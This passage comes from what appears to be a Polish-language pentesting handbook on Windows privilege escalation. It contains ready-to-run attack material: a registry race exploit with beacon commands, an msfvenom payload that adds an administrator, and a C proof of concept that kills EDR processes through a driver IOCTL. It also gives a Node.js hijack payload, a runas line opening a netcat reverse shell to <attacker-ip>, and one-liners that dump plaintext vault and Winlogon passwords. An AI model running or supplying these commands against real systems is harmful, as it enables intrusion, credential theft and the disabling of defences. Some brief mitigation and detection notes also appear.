- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` przechowuje kontrolowaną przez użytkownika konfigurację.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` jest tworzony podczas logowania/przejść do bezpiecznego pulpitu i może być zapisywany przez użytkownika.

Przebieg ataku (CVE-2026-24291 / ATConfig):

1. Ustaw w wartości **HKCU ATConfig** wartość, która ma zostać zapisana przez SYSTEM.
2. Wywołaj kopiowanie do bezpiecznego pulpitu (np. **LockWorkstation**), co uruchamia przepływ AT broker.
3. **Wygraj wyścig**, zakładając **oplock** na `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; gdy oplock zadziała, zastąp klucz **HKLM Session ATConfig** **linkiem rejestru** prowadzącym do chronionego celu HKLM.
4. SYSTEM zapisze wybraną przez atakującego wartość w przekierowanej ścieżce HKLM.

Po uzyskaniu możliwości zapisu dowolnej wartości HKLM przejdź do LPE, nadpisując wartości konfiguracji usług:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Wybierz usługę, którą zwykły użytkownik może uruchomić (np. **`msiserver`**), a następnie uruchom ją po wykonaniu zapisu. **Uwaga:** publiczna implementacja exploita **blokuje stację roboczą** w ramach wyścigu.

Przykładowe narzędzia (RegPwn BOF / standalone):
```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```
### Uprawnienia AppendData/AddSubdirectory w rejestrze usług

Jeśli masz to uprawnienie w odniesieniu do rejestru, oznacza to, że **możesz tworzyć podrzędne rejestry na jego podstawie**. W przypadku usług Windows jest to **wystarczające do wykonania dowolnego kodu:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Jeśli ścieżka do pliku wykonywalnego nie znajduje się w cudzysłowie, Windows spróbuje wykonać każdą część kończącą się przed spacją.

Na przykład dla ścieżki _C:\Program Files\Some Folder\Service.exe_ Windows spróbuje wykonać:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Wymień wszystkie ścieżki usług bez cudzysłowów, z wyłączeniem tych należących do wbudowanych usług systemu Windows:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Możesz wykryć i wykorzystać** tę podatność za pomocą metasploit: `exploit/windows/local/trusted\_service\_path` Możesz ręcznie utworzyć plik binarny usługi za pomocą metasploit:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Działania odzyskiwania

Windows pozwala użytkownikom określić działania, które mają zostać podjęte w przypadku awarii usługi. Funkcję tę można skonfigurować tak, aby wskazywała plik binarny. Jeśli ten plik binarny można podmienić, możliwa jest eskalacja uprawnień. Więcej informacji można znaleźć w [oficjalnej dokumentacji](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Applications

### Zainstalowane aplikacje

Sprawdź **uprawnienia plików binarnych** (być może możesz podmienić jeden z nich i przeprowadzić eskalację uprawnień) oraz **uprawnienia folderów** ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Uprawnienia zapisu

Sprawdź, czy możesz zmodyfikować jakiś plik konfiguracyjny, aby odczytać specjalny plik, lub czy możesz zmodyfikować plik binarny, który zostanie uruchomiony przez konto Administratora (schedtasks).

Sposobem na znalezienie słabych uprawnień folderów/plików w systemie jest wykonanie:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Persistence/execution przez automatyczne ładowanie pluginów Notepad++

Notepad++ automatycznie ładuje każdą bibliotekę DLL pluginu znajdującą się w podfolderach `plugins`. Jeśli dostępna jest zapisywalna instalacja portable/kopia, umieszczenie złośliwego pluginu zapewnia automatyczne wykonanie kodu wewnątrz `notepad++.exe` przy każdym uruchomieniu, w tym z `DllMain` i callbacków pluginu.

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Uruchamianie przy starcie

**Sprawdź, czy możesz nadpisać jakiś wpis rejestru lub plik binarny, który zostanie wykonany przez innego użytkownika.**\
**Przeczytaj** **następującą stronę**, aby dowiedzieć się więcej o interesujących **lokalizacjach autoruns umożliwiających eskalację uprawnień**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Sterowniki

Szukaj potencjalnych **dziwnych/podatnych** sterowników **firm trzecich**
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
Jeśli sterownik udostępnia primitive umożliwiający dowolny odczyt/zapis w kernelu (częste w źle zaprojektowanych handlerach IOCTL), możesz podnieść uprawnienia, bezpośrednio kradnąc token SYSTEM z pamięci kernela. Technikę krok po kroku opisano tutaj:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

W przypadku błędów race condition, w których podatne wywołanie otwiera ścieżkę Object Manager kontrolowaną przez atakującego, celowe spowolnienie lookup (za pomocą komponentów o maksymalnej długości lub głębokich łańcuchów katalogów) może wydłużyć okno z mikrosekund do dziesiątek mikrosekund:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### UAF w cancel-safe queue, ujawnienia z paged-pool i pivots do I/O ring

Niektóre łańcuchy Windows kernel LPE można zbudować z dwóch indywidualnie słabych błędów: **race condition cyklu życia cancel-safe queue**, która zwalnia request/CBD, gdy lock kolejki jest nadal zajęty, oraz ujawnienia typu **lock-release-before-copy**, które leakują zwolnioną alokację paged-pool podczas `RtlCopyToUser`.

Uwagi dotyczące audytu i exploitation:

- **Free-under-lock + cancel afterwards**: szukaj ścieżki sukcesu wykonującej **Acquire -> CompleteRequest/free -> Release**, podczas gdy ścieżka cancel wykonuje **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo**. Jeśli ścieżka sukcesu dociera do `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` przed zwolnieniem locka CBDQ/CSQ, wątek zablokowany w `NtCancelIoFileEx -> IopCsqCancelRoutine` może później wznowić działanie i przekazać zwolnione `PFLT_CALLBACK_DATA` z powrotem do callbacku remove sterownika.
- **Reclaim freed queue object** za pomocą kontrolowanej przez atakującego alokacji paged-pool o takim samym rozmiarze. `NPFS` Data Queue Entries są przydatne, ponieważ payload i rozmiar są kontrolowane, a później można je testować za pomocą operacji odczytu/peek pipe. Jeśli zwolniony obiekt zawiera list links, nadpisz je **cykliczną listą fake request nodes w pamięci user-mode**, aby sterownik wielokrotnie przetwarzał struktury request kontrolowane przez atakującego, zamiast kończyć działanie na oryginalnym headzie listy.
- **Upgrade a predictable write**: jeśli fake request przekierowuje nested context pointer używany przez zapisy bookkeeping (timestamps / QPC / pola sąsiadujące z refcount), możesz uzyskać **address-controlled but not value-controlled** kernel write. W takim przypadku zaatakuj pole **length/size** obiektu sprayed pool zamiast końcowego code/data pointer, a następnie przeszukuj spray, aż uszkodzony obiekt umożliwi **out-of-bounds paged-pool read**.
- **Raceable disclosure pattern**: każdy syscall wykonujący `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` jest dobrym kandydatem. Reliability poprawia się, gdy atakujący może powiększyć kopiowany buffer (na przykład przez dodanie wielu list/resource entries zwiększających końcowy rozmiar alokacji serializera), ponieważ dłuższe kopiowanie poszerza okno na replacement bez konieczności crashowania systemu.
- **Pointer-rich refill targets**: zarejestrowane tablice bufferów Windows **I/O ring** są doskonałymi celami disclosure, ponieważ ich rozmiar paged-pool jest kontrolowany przez atakującego (`8 * regBufferCnt`), a każdy element jest kernel pointerem do `_IOP_MC_BUFFER_ENTRY`. Zaleakuj jedną z tych tablic, odzyskaj otaczający ją `IORING_OBJECT`, a następnie uszkodź **`RegBuffers`** i **`RegBuffersCount`**, aby kolejne operacje I/O ring konsumowały sfałszowane przez atakującego entries i zapewniały arbitrary kernel read/write. Jeśli jedyny dostępny write daje stabilny bajt (na przykład z `KUSER_SHARED_DATA+0x14`), użyj **overlapping unaligned writes**, aby zbudować user pointer z powtarzających się bajtów, taki jak `0x0101010101010101`, zmapuj go za pomocą `VirtualAlloc` i umieść tam sfałszowaną tablicę registered-buffer.

Przydatne wskaźniki debugowania:
```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```
Po uzyskaniu dowolnego odczytu/zapisu kernela z uszkodzonego I/O ring, ukradnij token SYSTEM, korzystając ze standardowego workflow po uzyskaniu primitive:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Primitives korupcji pamięci registry hive

Nowoczesne luki w hive pozwalają przygotowywać deterministyczne layouty, nadużywać zapisywalnych potomków HKLM/HKU oraz przekształcać korupcję metadanych w przepełnienia kernel paged-pool bez custom drivera. Pełny łańcuch znajdziesz tutaj:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Confusion typów w trybie direct `RtlQueryRegistryValues` z path kontrolowanych przez atakującego

Niektóre drivery akceptują path registry od userland, sprawdzają wyłącznie, czy jest poprawnym stringiem UTF-16, a następnie wywołują `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` z `RTL_QUERY_REGISTRY_DIRECT` do scalaru na stacku, takiego jak `int readValue`. Jeśli brakuje `RTL_QUERY_REGISTRY_TYPECHECK`, `EntryContext` jest interpretowany zgodnie z **rzeczywistym** typem registry, a nie typem oczekiwanym przez developera.

Tworzy to dwie użyteczne primitives:

- **Confused deputy / oracle**: kontrolowany przez usera absolutny path `\Registry\...` pozwala driverowi odpytywać wybrane przez atakującego keys, ujawniać ich istnienie za pomocą kodów zwrotnych/logów, a czasami odczytywać values, do których caller nie miałby bezpośredniego dostępu.
- **Korupcja pamięci kernela**: destination scalar, taki jak `&readValue`, jest interpretowany jako `REG_QWORD`, `UNICODE_STRING` lub sized binary buffer, zależnie od typu registry value.

Praktyczne uwagi dotyczące exploitation:

- **Mitigation w Windows 8+**: jeśli query trafi do **untrusted hive** z `RTL_QUERY_REGISTRY_DIRECT`, ale bez `RTL_QUERY_REGISTRY_TYPECHECK`, caller kernela ulega crashowi z `KERNEL_SECURITY_CHECK_FAILURE (0x139)`. Aby zachować exploitability, szukaj **attacker-writable keys wewnątrz trusted system hives** zamiast umieszczać values w `HKCU`.
- **Staging w trusted-hive**: użyj NtObjectManager do wyliczenia zapisywalnych potomków `\Registry\Machine`, a następnie uruchom skan ponownie z duplikowanym tokenem **low-integrity**, aby znaleźć keys dostępne z kontekstów sandboxowanych:
```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```
- **`REG_QWORD`**: bezpośredni zapis 8 bajtów do 4-bajtowego `int` uszkadza sąsiednie dane stosu i może częściowo nadpisać znajdujący się w pobliżu wskaźnik callbacku/funkcji.
- **`REG_SZ` / `REG_EXPAND_SZ`**: tryb bezpośredni oczekuje, że `EntryContext` będzie wskazywać na `UNICODE_STRING`. Jeśli kod najpierw ładuje kontrolowaną przez atakującego wartość `REG_DWORD` do skalarnej zmiennej na stosie, a następnie ponownie używa tego samego bufora do odczytu stringa, atakujący kontroluje `Length`/`MaximumLength` i częściowo wpływa na wskaźnik `Buffer`, uzyskując częściowo kontrolowany zapis w kernelu.
- **`REG_BINARY`**: w przypadku dużych danych binarnych tryb bezpośredni traktuje pierwszy `LONG` pod adresem `EntryContext` jako rozmiar bufora ze znakiem. Jeśli wcześniejszy odczyt `REG_DWORD` pozostawi w ponownie użytej zmiennej skalarnej kontrolowaną przez atakującego wartość ujemną, kolejne zapytanie `REG_BINARY` kopiuje bajty atakującego bezpośrednio na sąsiednie pola stosu, co często stanowi najprostszą drogę do pełnego nadpisania wskaźnika callbacku.

Silny wzorzec do wyszukiwania: **heterogeniczne odczyty z rejestru do tej samej zmiennej na stosie bez jej ponownej inicjalizacji**. Przeszukuj kod pod kątem `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, ponownie używanych wskaźników `EntryContext` oraz ścieżek kodu, w których pierwszy odczyt z rejestru decyduje o tym, czy zostanie wykonany drugi odczyt.

#### Abusing missing FILE_DEVICE_SECURE_OPEN on device objects (LPE + EDR kill)

Niektóre podpisane sterowniki innych firm tworzą obiekt urządzenia z silnym SDDL za pomocą IoCreateDeviceSecure, ale zapominają ustawić `FILE_DEVICE_SECURE_OPEN` w `DeviceCharacteristics`. Bez tej flagi bezpieczny DACL nie jest egzekwowany, gdy urządzenie jest otwierane przez ścieżkę zawierającą dodatkowy komponent, co pozwala dowolnemu nieuprzywilejowanemu użytkownikowi uzyskać uchwyt za pomocą ścieżki przestrzeni nazw takiej jak:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (z rzeczywistego przypadku)

Gdy użytkownik może otworzyć urządzenie, uprzywilejowane IOCTL udostępniane przez sterownik mogą zostać wykorzystane do LPE i tampering. Przykładowe możliwości zaobserwowane w praktyce:
- Zwracanie uchwytów z pełnym dostępem do dowolnych procesów (kradzież tokenu / powłoka SYSTEM za pomocą DuplicateTokenEx/CreateProcessAsUser).
- Nieograniczony surowy odczyt/zapis dysku (tampering offline, sztuczki z persistence podczas rozruchu).
- Kończenie dowolnych procesów, w tym Protected Process/Light (PP/PPL), co pozwala na zabicie AV/EDR z user landu za pośrednictwem kernela.

Minimalny wzorzec PoC (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Mitigacje dla developerów
- Zawsze ustawiaj FILE_DEVICE_SECURE_OPEN podczas tworzenia obiektów urządzeń, które mają być ograniczone przez DACL.
- Weryfikuj kontekst wywołującego dla uprzywilejowanych operacji. Dodaj kontrole PP/PPL przed zezwoleniem na zakończenie procesu lub zwróceniem uchwytu.
- Ogranicz IOCTL (maski dostępu, METHOD_*, walidację danych wejściowych) i rozważ modele brokered zamiast bezpośrednich uprawnień jądra.

Pomysły na wykrywanie dla defenderów
- Monitoruj otwieranie podejrzanych nazw urządzeń w user-mode (np. \\ .\\amsdk*) oraz określone sekwencje IOCTL wskazujące na abuse.
- Wymuś Microsoft’s vulnerable driver blocklist (HVCI/WDAC/Smart App Control) i utrzymuj własne listy allow/deny.


## PATH DLL Hijacking

Jeśli masz **uprawnienia zapisu w folderze znajdującym się na PATH**, możesz być w stanie przejąć DLL ładowany przez proces i **eskalować uprawnienia**.

Sprawdź uprawnienia wszystkich folderów znajdujących się na PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Więcej informacji o tym, jak wykorzystać ten check:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Przejęcie rozwiązywania modułów Node.js / Electron za pośrednictwem `C:\node_modules`

Jest to wariant **Windows uncontrolled search path**, który dotyczy aplikacji **Node.js** i **Electron**, gdy wykonują bare import, taki jak `require("foo")`, a oczekiwany moduł jest **missing**.

Node rozwiązuje packages, przechodząc w górę drzewa katalogów i sprawdzając foldery `node_modules` w każdym katalogu nadrzędnym. W systemie Windows ta ścieżka może dotrzeć do katalogu głównego dysku, dlatego aplikacja uruchomiona z `C:\Users\Administrator\project\app.js` może ostatecznie sprawdzać:

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Jeśli **low-privileged user** może utworzyć `C:\node_modules`, może umieścić tam złośliwy `foo.js` (lub folder package) i oczekiwać, aż **higher-privileged Node/Electron process** spróbuje rozwiązać brakującą dependency. Payload wykonuje się w security context procesu ofiary, więc staje się to **LPE**, gdy target działa jako administrator, z elevated scheduled task/service wrapper lub jako auto-started privileged desktop app.

Jest to szczególnie częste, gdy:

- dependency jest zadeklarowana w `optionalDependencies`
- third-party library opakowuje `require("foo")` w `try/catch` i kontynuuje działanie po failure
- package został usunięty z production builds, pominięty podczas packaging lub nie udało się go zainstalować
- podatny `require()` znajduje się głęboko w dependency tree zamiast w głównym kodzie aplikacji

### Wyszukiwanie podatnych targetów

Użyj **Procmon**, aby potwierdzić resolution path:

- Ustaw filtr `Process Name` = target executable (`node.exe`, Electron app EXE lub wrapper process)
- Ustaw filtr `Path` `contains` `node_modules`
- Skup się na `NAME NOT FOUND` oraz końcowym pomyślnym otwarciu w `C:\node_modules`

Przydatne wzorce podczas code review w rozpakowanych plikach `.asar` lub źródłach aplikacji:
```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```
### Exploitation

1. Zidentyfikuj **nazwę brakującego pakietu** na podstawie Procmon lub analizy kodu źródłowego.
2. Utwórz katalog wyszukiwania root, jeśli jeszcze nie istnieje:
```powershell
mkdir C:\node_modules
```
3. Umieść moduł z dokładnie oczekiwaną nazwą:
```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```
4. Uruchom aplikację ofiary. Jeśli aplikacja spróbuje wykonać `require("foo")`, a prawidłowy moduł będzie nieobecny, Node może załadować `C:\node_modules\foo.js`.

Rzeczywiste przykłady brakujących opcjonalnych modułów pasujących do tego wzorca to `bluebird` i `utf-8-validate`, ale **technique** jest elementem uniwersalnym: znajdź dowolny **missing bare import**, który uprzywilejowany proces Windows Node/Electron rozwiąże.

### Pomysły dotyczące wykrywania i hardeningu

- Generuj alerty, gdy użytkownik tworzy `C:\node_modules` lub zapisuje w nim nowe pliki/pakiety `.js`.
- Wyszukuj procesy o wysokiej integralności odczytujące dane z `C:\node_modules\*`.
- Dołącz wszystkie zależności runtime do wersji produkcyjnej i audytuj użycie `optionalDependencies`.
- Sprawdzaj kod zewnętrznych bibliotek pod kątem wzorców `try { require("...") } catch {}` wykonywanych bez komunikatu.
- Wyłączaj opcjonalne próby wykrywania, gdy biblioteka to obsługuje (na przykład niektóre wdrożenia `ws` mogą pominąć starszą próbę wykrycia `utf-8-validate` za pomocą `WS_NO_UTF_8_VALIDATE=1`).

## Sieć

### Udostępnienia
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

Sprawdź, czy w pliku hosts są na stałe wpisane inne znane komputery
```
type C:\Windows\System32\drivers\etc\hosts
```
### Interfejsy sieciowe i DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Otwarte porty

Sprawdź **ograniczone usługi** z zewnątrz
```bash
netstat -ano #Opened ports?
```
### Tabela routingu
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### Tabela ARP
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Reguły zapory sieciowej

[**Sprawdź tę stronę, aby znaleźć polecenia związane z zaporą sieciową**](../basic-cmd-for-pentesters.md#firewall) **(wyświetlanie reguł, tworzenie reguł, wyłączanie, wyłączanie...)**

Więcej[ poleceń do network enumeration znajdziesz tutaj](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Binarny plik `bash.exe` można również znaleźć w `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Jeśli uzyskasz uprawnienia użytkownika root, możesz nasłuchiwać na dowolnym porcie (przy pierwszym użyciu `nc.exe` do nasłuchiwania na porcie pojawi się w GUI pytanie, czy `nc` powinien być dozwolony przez firewall).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Aby łatwo uruchomić bash jako root, możesz użyć `--default-user root`

Możesz przeglądać filesystem `WSL` w folderze `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Poświadczenia Windows

### Poświadczenia Winlogon
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Menedżer poświadczeń / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Windows Vault przechowuje poświadczenia użytkowników dla serwerów, stron internetowych i innych programów, do których **Windows** może **automatycznie logować użytkowników**. Na pierwszy rzut oka może się wydawać, że użytkownicy mogą przechowywać swoje poświadczenia Facebooka, Twittera, Gmaila itd., aby automatycznie logować się za pośrednictwem przeglądarek. Jednak tak nie jest.

Windows Vault przechowuje poświadczenia, których **dowolna aplikacja Windows wymagająca poświadczeń w celu uzyskania dostępu do zasobu** (serwera lub strony internetowej) może użyć do automatycznego logowania użytkowników. Oznacza to, że aplikacja może skorzystać z Credential Manager & Windows Vault i użyć dostarczonych poświadczeń, zamiast za każdym razem wymagać od użytkowników wprowadzania nazwy użytkownika i hasła.

Jeśli aplikacje nie komunikują się z Credential Manager, nie sądzę, aby mogły używać poświadczeń dla danego zasobu. Jeśli więc aplikacja ma korzystać z vault, powinna w jakiś sposób **komunikować się z credential manager i żądać poświadczeń dla tego zasobu** z domyślnego magazynu vault.

Użyj `cmdkey`, aby wyświetlić poświadczenia przechowywane na komputerze.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Następnie możesz użyć `runas` z opcją `/savecred`, aby użyć zapisanych danych uwierzytelniających. Poniższy przykład wywołuje zdalny plik binarny za pośrednictwem udziału SMB.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Używanie `runas` z podanym zestawem danych uwierzytelniających.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Zauważ, że można użyć mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html) lub [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### UWP PasswordVault / Credential Locker

Nowoczesne aplikacje UWP systemu Windows, Microsoft Edge oraz nowoczesne usługi systemowe przechowują tokeny uwierzytelniania i hasła w plaintext wewnątrz `PasswordVault` platformy Universal Windows Platform (UWP) (w `vaultcmd` dostępnego również jako `Web Credentials`). Ta przestrzeń przechowywania jest izolowana dla sesji i może być odszyfrowana natywnie bez uprawnień administratora ani `SeDebugPrivilege`.

Wykonaj to polecenie PowerShell w aktywnej sesji użytkownika, aby natychmiast zrzucić i odszyfrować wszystkie zapisane nazwy użytkowników oraz hasła w plaintext:
```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```
### DPAPI

**Data Protection API (DPAPI)** zapewnia metodę symetrycznego szyfrowania danych, używaną głównie w systemie operacyjnym Windows do symetrycznego szyfrowania asymetrycznych kluczy prywatnych. Szyfrowanie to wykorzystuje sekret użytkownika lub systemu, który w znacznym stopniu przyczynia się do entropii.

**DPAPI umożliwia szyfrowanie kluczy za pomocą klucza symetrycznego wyprowadzonego z sekretów logowania użytkownika**. W scenariuszach obejmujących szyfrowanie systemu wykorzystuje sekrety uwierzytelniania domenowego systemu.

Zaszyfrowane klucze RSA użytkownika, przy użyciu DPAPI, są przechowywane w katalogu `%APPDATA%\Microsoft\Protect\{SID}`, gdzie `{SID}` oznacza [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) użytkownika. **Klucz DPAPI, znajdujący się wraz z kluczem głównym chroniącym klucze prywatne użytkownika w tym samym pliku**, zazwyczaj składa się z 64 bajtów losowych danych. (Należy pamiętać, że dostęp do tego katalogu jest ograniczony, co uniemożliwia wyświetlenie jego zawartości za pomocą polecenia `dir` w CMD, choć można ją wyświetlić za pomocą PowerShell).
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Możesz użyć **mimikatz module** `dpapi::masterkey` z odpowiednimi argumentami (`/pvk` lub `/rpc)`), aby je odszyfrować.

**Pliki poświadczeń chronione hasłem głównym** zwykle znajdują się w:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Możesz użyć **mimikatz module** `dpapi::cred` z odpowiednim `/masterkey`, aby odszyfrować dane.\
Możesz **wyodrębnić wiele **masterkeys** DPAPI z **memory** za pomocą modułu `sekurlsa::dpapi` (jeśli masz uprawnienia root).

{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### Poświadczenia PowerShell

